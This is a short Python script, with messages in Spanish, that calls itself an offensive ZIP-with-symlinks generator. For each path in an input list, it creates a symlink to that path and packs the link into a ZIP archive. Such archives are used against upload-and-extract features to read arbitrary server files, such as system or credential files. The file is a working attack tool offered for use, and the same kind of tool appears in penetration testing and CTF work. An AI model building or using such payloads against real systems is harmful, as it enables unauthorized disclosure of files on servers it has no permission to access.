import os
import argparse
import subprocess

def create_symlink(source_path, link_name):
    try:
        os.symlink(source_path, link_name)
        print(f"[+] Symlink creado: {link_name} -> {source_path}")
    except FileExistsError:
        print(f"[!] Symlink ya existe: {link_name}")
    except Exception as e:
        print(f"[!] Error creando symlink: {e}")

def create_zip_with_symlink_cli(link_name, output_dir):
    zip_path = os.path.join(output_dir, f"{link_name}.zip")
    try:
        subprocess.run(["zip", "--symlinks", zip_path, link_name], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"[+] ZIP creado: {zip_path}")
    except subprocess.CalledProcessError:
        print(f"[!] Error al crear ZIP para {link_name}")

def cleanup_symlinks():
    for entry in os.listdir('.'):
        if os.path.islink(entry) and entry.startswith("link"):
            os.unlink(entry)

def main():
    parser = argparse.ArgumentParser(description="Generador de ZIPs con symlinks (modo ofensivo)")
    parser.add_argument("-f", "--file", required=True, help="Archivo con lista de rutas (una por línea)")
    args = parser.parse_args()

    if not os.path.exists("output"):
        os.makedirs("output")

    with open(args.file, "r") as f:
        lines = [line.strip() for line in f if line.strip()]

    for idx, path in enumerate(lines):
        link_name = f"link{idx}"
        create_symlink(path, link_name)
        create_zip_with_symlink_cli(link_name, "output")

    cleanup_symlinks()
    print("[✓] ZIPs generados con symlinks. Enlaces simbólicos limpiados.")

if __name__ == "__main__":
    main()
